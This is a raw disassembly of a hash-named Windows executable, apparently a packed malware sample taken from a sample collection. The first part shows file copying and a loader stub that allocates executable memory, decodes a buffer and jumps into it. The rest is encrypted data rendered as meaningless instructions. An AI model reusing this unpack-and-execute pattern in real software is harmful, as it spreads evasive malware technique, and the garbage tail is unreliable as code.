
376943c4d9e2001dadf24ee6d4e73a74e22bcef1ab026079cf66445dfc7648d7.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0x72474d4d
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	xchg   esp,eax
  41145b:	bound  esp,QWORD PTR [eax+0xdf9974a]
  411461:	jge    0x4113f3
  411463:	retf   0xf440
  411466:	push   0xb1a9aa13
  41146b:	mov    BYTE PTR [ebx-0x3f45190b],0xa0
  411472:	(bad)  
  411473:	in     eax,dx
  411474:	mov    ah,ch
  411476:	jae    0x4114b6
  411478:	ds inc edx
  41147a:	call   0x24a6d6a5
  41147f:	outs   dx,BYTE PTR ds:[esi]
  411480:	adc    dl,BYTE PTR [edi-0x63]
  411483:	pop    edx
  411484:	popf   
  411485:	cmp    dl,BYTE PTR ds:0x15bd218f
  41148b:	or     eax,0xc0a3489c
  411490:	adc    edx,edx
  411492:	cmp    bl,ah
  411494:	push   esi
  411495:	xchg   ebx,eax
  411496:	sbb    al,0xf4
  411498:	cmp    eax,DWORD PTR [edx]
  41149a:	int    0xab
  41149c:	add    BYTE PTR [eax-0x16],al
  41149f:	leave  
  4114a0:	add    al,0xc9
  4114a2:	xchg   ecx,eax
  4114a3:	inc    edx
  4114a4:	imul   BYTE PTR ds:0x683f37ef
  4114aa:	adc    ecx,DWORD PTR [edi+esi*1]
  4114ad:	or     bl,BYTE PTR [eax+0x21]
  4114b0:	or     BYTE PTR [ecx],bh
  4114b2:	mov    eax,ds:0xa888e102
  4114b7:	enter  0x7851,0x7c
  4114bb:	inc    ecx
  4114bc:	xor    DWORD PTR [edx+0x1b],eax
  4114bf:	daa    
  4114c0:	mov    esp,0xf83504b7
  4114c5:	push   es
  4114c6:	cmc    
  4114c7:	cmp    eax,0x1e5a663b
  4114cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114cd:	add    esp,ebx
  4114cf:	ds syscall 
  4114d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d3:	mov    bh,0xaa
  4114d5:	(bad)  
  4114d6:	jp     0x4114d6
  4114d8:	out    dx,eax
  4114d9:	ins    BYTE PTR es:[edi],dx
  4114da:	in     eax,0x97
  4114dc:	sbb    eax,esp
  4114de:	adc    al,0xe5
  4114e0:	cmp    BYTE PTR [ecx-0x5],ah
  4114e3:	push   ds
  4114e4:	fidivr DWORD PTR [edx]
  4114e6:	icebp  
  4114e7:	xlat   BYTE PTR ds:[ebx]
  4114e8:	pop    eax
  4114e9:	iret   
  4114ea:	xchg   ebp,eax
  4114eb:	mov    al,0x1f
  4114ed:	sub    esi,ecx
  4114ef:	in     eax,0x76
  4114f1:	sbb    BYTE PTR [ecx+edx*2+0x3b],0xf0
  4114f6:	ins    BYTE PTR es:[edi],dx
  4114f7:	lods   al,BYTE PTR ds:[esi]
  4114f8:	mov    dh,0xfb
  4114fa:	adc    DWORD PTR [ecx],esi
  4114fc:	fsubr  st(0),st
  4114fe:	pop    edx
  4114ff:	fistp  DWORD PTR [edx-0x13]
  411502:	or     DWORD PTR [ecx],eax
  411504:	inc    ebx
  411505:	or     esp,DWORD PTR [eax-0x3747ebb5]
  41150b:	mov    ch,0x2a
  41150d:	jge    0x4114c4
  41150f:	xchg   DWORD PTR [edx-0x14d9a559],esi
  411515:	mov    BYTE PTR [ebx+0x54667e3f],al
  41151b:	sub    DWORD PTR [edx-0x31],0x60cb982b
  411522:	sub    eax,0xc613d7ee
  411527:	lds    esi,FWORD PTR [eax]
  411529:	mov    ebx,0x877015e5
  41152e:	lods   al,BYTE PTR ds:[esi]
  41152f:	inc    esi
  411530:	push   eax
  411531:	adc    eax,0x6777dce0
  411536:	repnz pop ecx
  411538:	out    0x60,al
  41153a:	stos   BYTE PTR es:[edi],al
  41153b:	sar    BYTE PTR [eax-0x4a3d32b8],1
  411541:	mov    es,WORD PTR [edx+edx*8-0x37029ea9]
  411548:	push   cs
  411549:	dec    esi
  41154a:	mov    esi,edx
  41154c:	into   
  41154d:	daa    
  41154e:	pop    ecx
  41154f:	nop
  411550:	stc    
  411551:	js     0x41150e
  411553:	sub    BYTE PTR [edx-0x1eaaa919],0x46
  41155a:	jl     0x4114dc
  41155c:	in     al,dx
  41155d:	adc    eax,0xec2edab8
  411562:	aas    
  411563:	xchg   esp,eax
  411564:	scas   eax,DWORD PTR es:[edi]
  411565:	jp     0x41155c
  411567:	add    al,0x29
  411569:	and    al,0xf0
  41156b:	xor    dh,dl
  41156d:	pop    esi
  41156e:	xchg   edi,eax
  41156f:	call   0xcb6e8d3e
  411574:	adc    dh,al
  411576:	gs clc 
  411578:	hlt    
  411579:	es dec edi
  41157b:	add    dl,dl
  41157d:	call   0xedbd849d
  411582:	rcr    BYTE PTR [eax+ecx*2-0x12],0xd7
  411587:	arpl   WORD PTR [ebx-0x6d9f8b39],cx
  41158d:	mov    cl,0xb2
  41158f:	popf   
  411590:	arpl   WORD PTR [esi-0x16d18684],si
  411596:	test   DWORD PTR [ecx-0x38],ebp
  411599:	in     al,0x4e
  41159b:	adc    cl,dh
  41159d:	inc    ecx
  41159e:	bound  ecx,QWORD PTR [edx]
  4115a0:	test   ebp,esp
  4115a2:	pop    ss
  4115a3:	adc    al,0x13
  4115a5:	mov    eax,ds:0x2df8ae40
  4115aa:	ret    0x4cb
  4115ad:	pop    ss
  4115ae:	ret    0x15ba
  4115b1:	pushf  
  4115b2:	xchg   BYTE PTR [eax],dl
  4115b4:	les    esp,FWORD PTR [ebx]
  4115b6:	inc    ebx
  4115b7:	int    0xe8
  4115b9:	or     ecx,ebp
  4115bb:	aam    0xf7
  4115bd:	dec    edx
  4115be:	cwde   
  4115bf:	or     DWORD PTR [ecx+0x49423199],esi
  4115c5:	ins    DWORD PTR es:[edi],dx
  4115c6:	mov    bl,0xe0
  4115c8:	pop    esi
  4115c9:	lds    edx,FWORD PTR [ecx]
  4115cb:	out    0x77,al
  4115cd:	pop    ebp
  4115ce:	(bad)  
  4115cf:	sbb    DWORD PTR [edx-0x5b18e904],ebp
  4115d5:	dec    esi
  4115d6:	enter  0x4662,0x83
  4115da:	push   ss
  4115db:	mov    eax,ds:0xfbf287cf
  4115e0:	test   BYTE PTR [esi-0x2634c128],ch
  4115e6:	inc    edx
  4115e7:	dec    esi
  4115e8:	int3   
  4115e9:	xchg   BYTE PTR [edx-0x3730e9f7],bh
  4115ef:	out    dx,al
  4115f0:	push   ebx
  4115f1:	push   ebx
  4115f2:	dec    edx
  4115f3:	jmp    0x9ef9d573
  4115f8:	ins    BYTE PTR es:[edi],dx
  4115f9:	adc    dl,bh
  4115fb:	cwde   
  4115fc:	mov    WORD PTR [edi-0xe],gs
  4115ff:	mov    al,ds:0x94d0612b
  411604:	and    edx,DWORD PTR [ecx-0x3d]
  411607:	pop    edx
  411608:	mov    bl,0xc9
  41160a:	aad    0xf1
  41160c:	in     eax,dx
  41160d:	xor    al,0xb4
  41160f:	pop    eax
  411610:	cmp    BYTE PTR [eax+0x1c],bh
  411613:	or     bh,BYTE PTR [ecx+ebx*1]
  411616:	jbe    0x4115fe
  411618:	xor    esi,eax
  41161a:	lods   al,BYTE PTR ds:[esi]
  41161b:	lea    ebx,fs:[ecx+0x4]
  41161f:	pop    ebx
  411620:	pop    ebx
  411621:	pop    ecx
  411622:	pop    ds
  411623:	loopne 0x411658
  411625:	mov    ch,BYTE PTR [eax+0x6cad898c]
  41162b:	je     0x4115fe
  41162d:	mov    esp,0x42b9fb47
  411632:	jne    0x411693
  411634:	pop    ss
  411635:	sahf   
  411636:	arpl   cx,ax
  411638:	push   edi
  411639:	mov    ch,0xc
  41163b:	add    DWORD PTR [eax],ebp
  41163d:	test   DWORD PTR [edx+0x7714acc1],esi
  411643:	add    al,0x48
  411645:	adc    eax,0xd4856a0f
  41164a:	jp     0x4116b8
  41164c:	data16 mov ah,0x2e
  41164f:	fild   QWORD PTR [ebx+0x3b429ecb]
  411655:	inc    eax
  411656:	shr    DWORD PTR [edi-0x68],0x6b
  41165a:	nop
  41165b:	mov    al,0x34
  41165d:	and    ebx,DWORD PTR [edi]
  41165f:	in     al,0xf1
  411661:	jno    0x41167c
  411663:	jae    0x411645
  411665:	sbb    BYTE PTR [edx-0x3],ah
  411668:	xchg   ebx,eax
  411669:	or     DWORD PTR [edx-0x2c],0x14
  41166d:	sbb    al,0x8b
  41166f:	sub    edi,DWORD PTR [edi-0x519b9add]
  411675:	or     al,0xcc
  411677:	push   ebp
  411678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411679:	cli    
  41167a:	pop    edi
  41167b:	enter  0x1c04,0x66
  41167f:	bound  esi,QWORD PTR [eax+ecx*1]
  411682:	out    dx,eax
  411683:	or     BYTE PTR [ebp+0x51],ah
  411686:	sub    bl,BYTE PTR [eax+eiz*1]
  411689:	pushf  
  41168a:	mov    edx,0x2cd0ef3b
  41168f:	add    DWORD PTR [ecx],0x3d
  411692:	ds (bad) 
  411695:	in     eax,dx
  411696:	retf   0x73da
  411699:	out    0x73,al
  41169b:	sahf   
  41169c:	and    al,0xbd
  41169e:	push   eax
  41169f:	xchg   ebx,eax
  4116a0:	sub    eax,0x9b11db7f
  4116a5:	test   BYTE PTR [esi],ch
  4116a7:	mov    eax,0x8288b6e
  4116ac:	jae    0x4116e6
  4116ae:	hlt    
  4116af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b0:	out    0xd1,al
  4116b2:	inc    edi
  4116b3:	pop    esp
  4116b4:	lds    ecx,FWORD PTR [eax+0x6335edfe]
  4116ba:	sahf   
  4116bb:	pop    ebp
  4116bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116bd:	daa    
  4116be:	mov    ds:0x57a088ff,al
  4116c3:	jl     0x7953e4c2
  4116c9:	js     0x4116eb
  4116cb:	mov    ah,0x3d
  4116cd:	pop    edi
  4116ce:	jl     0x411742
  4116d0:	ret    0xc881
  4116d3:	xlat   BYTE PTR ds:[ebx]
  4116d4:	loopne 0x411741
  4116d6:	adc    ebx,DWORD PTR [ebx-0x191310c5]
  4116dc:	das    
  4116dd:	(bad)  
  4116de:	rep stos BYTE PTR es:[edi],al
  4116e0:	jb     0x4116a5
  4116e2:	pop    ebp
  4116e3:	das    
  4116e4:	inc    DWORD PTR [edx]
  4116e6:	clc    
  4116e7:	xchg   ebx,eax
  4116e8:	push   ss
  4116e9:	mov    al,ds:0x31480073
  4116ee:	rol    al,cl
  4116f0:	out    0xc0,al
  4116f2:	sbb    al,0x2e
  4116f4:	xchg   dh,cl
  4116f6:	cs loope 0x411736
  4116f9:	sub    dh,BYTE PTR [ebx+0x69]
  4116fc:	or     dl,BYTE PTR [ecx-0x67196e10]
  411702:	outs   dx,DWORD PTR ds:[esi]
  411703:	sbb    DWORD PTR [edx],edi
  411705:	ret    0xf691
  411708:	sub    dl,cl
  41170a:	(bad)  
  41170b:	adc    ebx,DWORD PTR [ecx-0xbfadb76]
  411711:	add    edi,ebx
  411713:	mov    edx,0xea7a4a6b
  411718:	mov    ebp,0x943b4720
  41171d:	dec    eax
  41171e:	mov    ecx,0xde283a26
  411723:	mov    fs,WORD PTR [ecx]
  411725:	add    DWORD PTR [eax+ebx*2+0x18],esp
  411729:	push   eax
  41172a:	aaa    
  41172b:	and    esp,DWORD PTR [esi-0x73]
  41172e:	jmp    0x70a9ec5f
  411733:	into   
  411734:	(bad)  
  411735:	push   ecx
  411736:	xchg   edi,eax
  411737:	dec    edi
  411738:	adc    ebp,DWORD PTR ds:0x17034a94
  41173e:	das    
  41173f:	push   ebp
  411740:	push   ds
  411741:	add    BYTE PTR [edx+0x7fee2b09],al
  411747:	xchg   edi,eax
  411748:	mov    ch,0x69
  41174a:	cmc    
  41174b:	sbb    al,0x2d
  41174d:	add    eax,0xdfbf412a
  411752:	sub    esi,DWORD PTR [eax+0xe]
  411755:	dec    ebp
  411756:	and    al,0x3b
  411758:	inc    edi
  411759:	fidiv  DWORD PTR [esi+0x4e]
  41175c:	out    dx,eax
  41175d:	rcr    dh,cl
  41175f:	pop    ecx
  411760:	adc    eax,0x5422508e
  411765:	push   esp
  411766:	pusha  
  411767:	sbb    al,0x7
  411769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176a:	fiadd  WORD PTR [esi-0x56]
  41176d:	cmp    eax,0xb825cf13
  411772:	call   0xe2a53fb
  411777:	sti    
  411778:	dec    edx
  411779:	add    eax,0x4cc465ee
  41177e:	push   cs
  41177f:	frstor [esp+ebx*8+0x3bf5135]
  411786:	mov    ah,0xf
  411788:	cmp    BYTE PTR [eax],al
  41178a:	iret   
  41178b:	int    0x92
  41178d:	(bad)  
  41178e:	mov    esp,0x360f4053
  411793:	iret   
  411794:	gs jmp 0x9846:0x84185e72
  41179c:	adc    DWORD PTR [esi-0x6189d02f],esp
  4117a2:	cdq    
  4117a3:	xor    eax,0x9e2bea39
  4117a8:	mov    ?,WORD PTR [esi+0x31f08f64]
  4117ae:	addr16 sahf 
  4117b0:	jmp    0x43c5:0x8a541632
  4117b7:	mov    bh,0x7c
  4117b9:	test   al,0x89
  4117bb:	push   ebp
  4117bc:	sub    ebx,DWORD PTR [ebx-0x4bc0f36f]
  4117c2:	mov    edx,0x8870a93c
  4117c7:	out    0x58,al
  4117c9:	push   ss
  4117ca:	imul   esi,ebx,0xe0dde1e2
  4117d0:	div    DWORD PTR [esi+0xf047fbd]
  4117d6:	icebp  
  4117d7:	cmp    ah,BYTE PTR [edx]
  4117d9:	mov    DWORD PTR [edx-0x22],ebx
  4117dc:	mov    ecx,0xb4b65e0
  4117e1:	lahf   
  4117e2:	int3   
  4117e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e4:	adc    bl,BYTE PTR [ecx+0x78cc9f55]
  4117ea:	aaa    
  4117eb:	fsubr  DWORD PTR ds:0xe1424d18
  4117f1:	xchg   esi,eax
  4117f2:	stos   BYTE PTR es:[edi],al
  4117f3:	mov    ah,0xb5
  4117f5:	call   0xe7645183
  4117fa:	test   BYTE PTR [edx+0x20],0x38
  4117fe:	imul   esi,DWORD PTR [edi],0xffffff8c
  411801:	or     DWORD PTR [edx],esp
  411803:	lods   eax,DWORD PTR ds:[si]
  411805:	jno    0x41179c
  411807:	pop    ds
  411808:	js     0x41184a
  41180a:	xor    cl,BYTE PTR [edx]
  41180c:	popa   
  41180d:	lods   eax,DWORD PTR ds:[esi]
  41180e:	xor    ch,BYTE PTR [ebx-0x5d]
  411811:	mov    ebx,es
  411813:	pop    ebp
  411814:	add    esp,0xf175c575
  41181a:	ret    0xe49c
  41181d:	fstp   QWORD PTR [ebx+0x5c]
  411820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411821:	mov    esi,0x89f0b7fd
  411826:	loopne 0x411818
  411828:	mov    al,0xf6
  41182a:	gs pop ss
  41182c:	mov    ah,0xce
  41182e:	xlat   BYTE PTR ds:[ebx]
  41182f:	add    DWORD PTR ds:0x3d751d63,0x7a419058
  411839:	inc    ebp
  41183a:	sub    edi,DWORD PTR [esi+0x7e]
  41183d:	cld    
  41183e:	or     al,0xfa
  411840:	call   0x7202:0x13a40584
  411847:	sub    al,0xc
  411849:	adc    eax,0xdfe463c8
  41184e:	add    al,0x8a
  411850:	dec    ebx
  411851:	jnp    0x4118b7
  411853:	fisub  WORD PTR [edi-0x61a86114]
  41185a:	nop
  41185b:	inc    edx
  41185c:	adc    eax,0xa410c5cc
  411861:	xchg   ebp,eax
  411862:	push   eax
  411863:	jae    0x4117e6
  411865:	repz call 0xedfb:0x19b04640
  41186d:	mov    esi,ebx
  41186f:	dec    esp
  411870:	leave  
  411871:	fwait
  411872:	mov    edx,0x7071284c
  411877:	xchg   BYTE PTR [eax-0x91b91a1],bh
  41187d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41187e:	mov    ds:0x222a625,eax
  411883:	retf   
  411884:	xchg   ebx,eax
  411885:	in     eax,dx
  411886:	mov    cl,0xf4
  411888:	in     eax,0xe0
  41188a:	pushf  
  41188b:	loop   0x411895
  41188d:	mov    edx,0x8480f1bd
  411892:	or     DWORD PTR [ebp-0x6a],0x5f
  411896:	sti    
  411897:	mov    cl,0xd0
  411899:	(bad)  
  41189a:	cli    
  41189b:	repnz sub eax,0x85eff2e3
  4118a1:	xchg   esp,eax
  4118a2:	test   DWORD PTR [eax+0x56],0xba904a1e
  4118a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118aa:	fdiv   DWORD PTR [edi+0x5f]
